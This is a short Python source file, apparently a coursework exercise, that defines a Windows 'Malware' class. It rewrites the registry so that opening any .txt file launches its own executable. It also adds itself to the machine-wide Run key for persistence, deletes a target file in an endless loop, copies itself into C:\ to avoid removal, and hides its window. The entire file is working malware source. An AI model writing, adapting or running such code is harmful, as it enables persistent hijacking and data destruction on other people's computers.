import winreg
import tkinter as tk
import os
import time
import shutil
import sys
import threading


class Malware(object):
    def __init__(self):
        self.run = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'    # local machine
        self.scriptPath = r'D:\_FILES\CODES\Python\MaliciousCodes_wzk\malware.py'
        self.removePath = r'C:\Users\zhikangwang\Desktop\test.txt'
        self.sysPath = r'C:\xxx.py'
        self.txt = r'txtfile\shell\open\command'    # class root
        self.exePath = r'D:\_FILES\CODES\Python\MaliciousCodes_wzk\dist\malware.exe %1'

    def openTxt(self):
        try:
            os.system('notepad {}'.format(sys.argv[1]))    # recv arg from outside
        except IndexError as e:    # when no txt file to open
            print(e)

    def changeTxtOpen(self):
        key = winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, self.txt, 0, access=winreg.KEY_ALL_ACCESS)
        try:
            # print(winreg.QueryValueEx(key, ""))
            winreg.SetValueEx(key, "", 0, winreg.REG_EXPAND_SZ, self.exePath)    # add
            print("txt open changed\n")
        except WindowsError:
            print(WindowsError)

    def autoRun(self):
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, self.run, access=winreg.KEY_ALL_ACCESS)
        try:
            winreg.SetValueEx(key, "maliciousCode", 0, winreg.REG_SZ, self.scriptPath)    # add this script to Run key
            print("auto run\n")
        except WindowsError:
            print(WindowsError)

    def removeFile(self):
        while True:
            try:
                os.remove(self.removePath)
                print("removed\n")
                # break
            except OSError:    # if file not exisits or being used, try 10s later
                time.sleep(15)
                print("no\n")
                # break

    def move2sys(self):
        """
        move this script to system directory in case to be found and deleted
        """
        shutil.copy(self.scriptPath, self.sysPath)

    def main(self):
        self.openTxt()
        t = threading.Thread(target=self.removeFile)
        # t.setDaemon(True)
        t.start()
        self.changeTxtOpen()
        self.autoRun()
        # self.removeFile()
        self.move2sys()
        t.join()


if __name__ == "__main__":
    top = tk.Tk()
    top.withdraw()    # hide window
    malware = Malware()
    malware.main()
    # malware.autoRun()
    # malware.removeFile()
    # malware.move2sys()
    # malware.openTxt()
    # top.mainloop()    # use mainloop to keep script running
